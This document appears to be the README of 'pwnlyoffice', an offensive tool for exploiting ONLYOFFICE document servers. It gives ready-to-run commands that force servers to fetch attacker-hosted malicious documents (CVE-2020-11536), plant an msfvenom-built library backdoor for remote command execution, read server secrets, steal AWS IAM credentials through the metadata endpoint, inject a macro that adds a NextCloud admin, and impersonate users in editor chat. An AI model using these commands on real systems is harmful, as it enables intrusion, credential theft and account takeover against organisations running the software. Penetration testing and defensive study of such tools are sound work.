# pwnlyoffice

Exploit ONLYOFFICE Implementations

## Sub-commands

`pwnlyoffice` has a number of sub-commands to carry out actions against vulnerable instances of OnlyOffice. The main ones are:

 - **dl**: Connect to the ONLYOFFICE document server and request that it downloads a provided URL. This can be used to test an instances to see if it has an unauthenticated / weak websocket. A random document id is created and this sub-command can be used to inject a malicious document into the document server (CVE-2020-11536)
 - **macro**: If a pre-existing document id is known, this will inject the given JavaScript file into it as a macro. Two example exploits for NextCloud are included in `/macros`, plus a basic PoC alert box.
 - **chat**: If a pre-existing document id is known, this allows you to connect to the in-editor chat function and pretend to be any user id of your choice.
 - **backdoor**: Generate a malicious document which exploits CVE-2020-11536 to write a backdoor on the server.
 - **shell**: Run commands against a server which has been compromised with the backdoor.
 - **enum**: Attempt to guess valid document ids by providing a file containing a list of potential ids. The script will try each one to find a valid pre-existing document.

## Examples

### Test if a server is vulnerable

```bash
./pwnlyoffice.py -u https://theonlyofficesiteurl -D https://yoursite/uniquepath dl
```

Any hits to `/uniquepath` means that the server meets the conditions for being able to have a malicious document injected into it:

1. The authentication is either absent or uses the default JWT signing key
2. The server is able to reach out to the Internet

### Generate a malicious document

```bash
./pwnlyoffice.py -u https://theonlyofficesiteurl backdoor
```

This generates `backdoor.docx`. Host this on a web server which is visible to the document server.

When loaded in ONLYOFFICE, this will write a number of files into `/var/www/onlyoffice/documentserver/server/FileConverter/bin` using CVE-2020-11536.

 - `proxy.sh` - written to `x2t.sh` and will proxy through any commands for x2t in order to provide arbitrary RCE
 - `hijack.so` - generated using `msfvenom -a x64 -p linux/x64/exec CMD="cp bin/x2t bin/x2t.new; mv bin/x2t.sh bin/x2t; chmod u+x bin/x2t" -f elf-so -o hijack.so`. This is written to the server as `libpthread.so` in order to be loaded higher up the `ld` search and execute a command which switches out the legit `x2t` binary for a script which proxies it.
 - `x2t` - this is the legit `x2t`, written to `x2t.old` because in case anything goes wrong, that file will be there to restore `x2t`

To restore a borked server back to pre-pwned state in case anything went wrong with this, `libpthread.so` should not be in `FileConverter/bin` - delete that. `x2t` should be the legit `x2t` iELF binary and not a bash script. There shouldn't be any `.sh` files in that folder.

### Prompt Document Server to Download Malicious document

```bash
./pwnlyoffice.py -u https://theonlyofficesiteurl -D https://yoursite/backdoor.docx dl
```


### Run Shell Commands on Server


```bash
./pwnlyoffice.py -u https://theonlyofficesiteurl shell
```

#### Useful commands

Get the document cache folder location:

```bash
grep -A 2 storage /etc/onlyoffice/documentserver/*linux.json | grep folderPath
```

Get server secret strings (do we need them at this point?)

```bash
grep -i secret /etc/onlyoffice/documentserver/*
```

### Query the document server DB

```bash
./pwnlyoffice.py -u https://theonlyofficesiteurl sql
```

Get a list of valid document ids with `SELECT DISTINCT id FROM task_result`

### Get AWS Temporary Credentials

```bash
./pwnlyoffice.py -u https://theonlyofficesiteurl -D http://169.254.169.254/latest/meta-data/iam/security-credentials dl
```

### Inject a Macro Into a Known Doc id 

This macro adds an admin user into Nextcloud. The document id is `1234` and has to be known by the attacker. These vary depending on what the underlying document management system is.

``bash
./pwnlyoffice.py -d 1234 -u https://theonlyofficesiteurl macro macros/nextcloud_addadmin.js
```

### Chat with legitimate users

Masquerading as a user called "Bob", connected to document id "1234"

``bash
./pwnlyoffice.py -d 1234 -u https://theonlyofficesiteurl -U Bob chat
```
